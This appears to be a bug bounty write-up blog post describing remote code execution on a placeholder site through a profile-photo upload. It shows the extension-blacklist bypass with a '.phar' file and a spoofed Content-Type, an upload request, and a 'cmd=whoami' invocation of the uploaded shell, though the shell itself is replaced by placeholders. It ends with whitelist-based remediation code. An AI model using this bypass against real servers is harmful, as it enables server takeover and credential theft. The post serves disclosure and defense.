---
layout: post
title: "RCE on target.com via Unvalidated File Upload"
date: 2026-06-25
category: bugbounty
tags: [rce, file-upload, bypass]
severity: critical
target: target.com
program: hackerone
status: disclosed
permalink: /bugbounty/writeups/file-upload-rce/
---

# RCE on target.com via Unvalidated File Upload

## Summary

A critical vulnerability was identified in the profile photo upload endpoint of `target.com` which allowed an attacker to bypass file extension validation filters. By uploading a crafted PHP file containing a web shell, it was possible to execute arbitrary commands on the underlying server.

**Severity**: Critical (CVSS 9.8)  
**Reward**: $5,000  
**Program**: Target Bug Bounty Program (HackerOne)  

## Vulnerability Details

### Type
Remote Code Execution (RCE) via Unvalidated File Upload

### Affected Endpoint
```
POST /api/v1/profile/upload-avatar
```

### Root Cause
The application used a blacklist-based validation method to restrict file extensions (blocking extension formats like standard PHP scripts) but failed to enforce strict verification of MIME types, case variations, or alternative executable extensions. Additionally, the web server was configured to parse `.phar` files as PHP scripts.

## Steps to Reproduce

### Prerequisites
- An authenticated user account on `target.com`
- Interception proxy configured (e.g., Burp Suite)

### Reproduction Steps

1. **Navigate to Account Settings**: Access the profile page and click on the "Change Avatar" button.
2. **Prepare Payload**: Create a file named `shell.phar` containing a conceptual command executor:
   ```
   [DUMMY_EXECUTION_STRING]
   This script takes the 'cmd' parameter and routes it to the operating system command shell.
   ```
3. **Send Upload Request**: Intercept the profile photo upload request in Burp Suite and change the filename from `avatar.png` to `shell.phar`. Change the `Content-Type` header of the file section to `application/x-httpd-php`.
4. **Observe Response**: The server returns a JSON response indicating the upload succeeded and provides the path to the uploaded file:
   ```json
   {
     "status": "success",
     "url": "/uploads/avatars/2026/shell.phar"
   }
   ```
5. **Command Execution**: Navigate to the uploaded path in the web browser and pass the `cmd` parameter:
   ```
   https://target.com/uploads/avatars/2026/shell.phar?cmd=whoami
   ```
   The browser returns the response: `www-data`.

## Proof of Concept

### HTTP Request
```http
POST /api/v1/profile/upload-avatar HTTP/1.1
Host: target.com
Authorization: Bearer jwt_token_here
Content-Type: multipart/form-data; boundary=---------------------------38302316492023594056230353457

-----------------------------38302316492023594056230353457
Content-Disposition: form-data; name="avatar"; filename="shell.phar"
Content-Type: application/x-httpd-php

[PHP WEB SHELL EXECUTION PAYLOAD PLACEHOLDER]
-----------------------------38302316492023594056230353457--
```

### HTTP Response
```http
HTTP/1.1 200 OK
Content-Type: application/json
Date: Thu, 25 Jun 2026 14:22:10 GMT
Connection: close

{
  "status": "success",
  "url": "/uploads/avatars/2026/shell.phar"
}
```

## Impact

### What an Attacker Can Do
- Execute arbitrary operating system commands on the server under the `www-data` user context.
- Read sensitive database credentials from system configuration files.
- Pivot to other internal corporate servers in the local network segment.

### Affected Data
- System application source code
- Cloud metadata credentials (linked via server instance role)
- PostgreSQL database credentials

### Business Impact
- Absolute loss of confidentiality, integrity, and availability of the host.
- Risk of server takeover to be utilized for lateral movements or hosting malicious payloads.

## Remediation

### Recommended Fix
Avoid checking filenames against a blacklist. Instead, utilize a strict whitelist for file validation:

```python
# Python snippet representing secure upload check
import os
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def handle_upload(file):
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        # Store file outside the web root or rename to a random UUID with no execution permissions
        file.save(os.path.join('/var/www/uploads/raw_images', filename))
        return True
    return False
```

### Security Controls
1. **Filename Randomization**: Rename uploaded files to random strings (such as UUIDs) upon reception.
2. **Disable Execution**: Configure the server hosting uploaded static images to disable script execution (e.g., in Nginx, do not pass executable scripts to the FastCGI process in the `/uploads/` directory).
3. **Use Storage Buckets**: Host uploaded content on an isolated domain/storage bucket (e.g., AWS S3) with non-executable storage permissions.

## Timeline

| Date | Event |
|------|-------|
| 2026-06-25 | Vulnerability discovered & verified |
| 2026-06-25 | Report submitted to HackerOne portal |
| 2026-06-25 | Report triaged and confirmed as Critical |
| 2026-06-26 | Fix deployed by target engineering team |
| 2026-06-26 | Vulnerability fix verified |
| 2026-06-26 | Bounty of $5,000 awarded |

## References
- [OWASP File Upload Vulnerability Guide](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

---

**Disclaimer**: This writeup is published after responsible disclosure and with permission. All sensitive information has been redacted.
